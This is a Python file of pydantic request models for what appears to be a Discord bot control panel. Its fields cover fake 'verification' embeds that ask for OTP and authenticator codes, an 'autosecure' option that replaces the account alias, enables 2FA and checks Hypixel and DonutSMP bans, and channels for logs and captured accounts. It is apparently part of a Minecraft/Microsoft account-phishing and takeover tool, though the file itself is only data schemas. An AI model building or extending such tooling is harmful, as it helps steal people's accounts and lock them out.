from pydantic import BaseModel


class LoginRequest(BaseModel):
    username: str
    password: str
    totp_code: str | None = None

class RecoveryRequest(BaseModel):
    email: str
    recovery_code: str

class PasswordRequest(BaseModel):
    email: str
    password: str
    totp_secret: str

class BulkRequest(BaseModel):
    entries: list[str]

class ChangePasswordRequest(BaseModel):
    current_password: str
    new_password: str
    totp_code: str | None = None

class Setup2FARequest(BaseModel):
    secret: str

class EmailCreateRequest(BaseModel):
    email: str

class ShareLinkRequest(BaseModel):
    password: str | None = None

class RealCommandsRequest(BaseModel):
    commands: dict[str, bool]

class FakeCommandRequest(BaseModel):
    title: str
    description: str
    response: str

class OwnerAddRequest(BaseModel):
    id: int

class RenameCommandRequest(BaseModel):
    aliases: dict[str, str | None]

class BotStatusRequest(BaseModel):
    status: str
    activity_text: str = ""
    activity_type: str = "playing"

class AutosecureRequest(BaseModel):
    replace_main_alias: bool
    enable_2fa: bool
    minecon_mode: bool
    check_hypixel_ban: bool | None = None
    check_donutsmp_ban: bool | None = None

class VerificationEmbedRequest(BaseModel):
    title: str
    description: str
    color: int
    ephemeral: bool

class PostVerificationAction(BaseModel):
    type: str
    role_id: str = ""
    message_content: str = ""
    channel_name: str = ""
    channel_category_id: str = ""
    channel_embed_title: str = ""
    channel_embed_description: str = ""
    channel_embed_color: int = 0x3B89FF

class PostVerificationRequest(BaseModel):
    actions: list[PostVerificationAction] = []

class EmbedData(BaseModel):
    title: str
    description: str
    color: int

class AuthEmbedsRequest(BaseModel):
    otp: EmbedData
    authenticator: EmbedData

class AfterVerifyEmbedRequest(BaseModel):
    embed: EmbedData

class BeforeAuthEmbedRequest(BaseModel):
    embed: EmbedData

class VerificationButtonRequest(BaseModel):
    text: str
    color: str

class UpdateChannelRequest(BaseModel):
    logs_channel: str = ""
    accounts_channel: str = ""
    censored_logs_channel: str = ""
    verify_channel: str = ""

class UpdateTokenRequest(BaseModel):
    bot_token: str
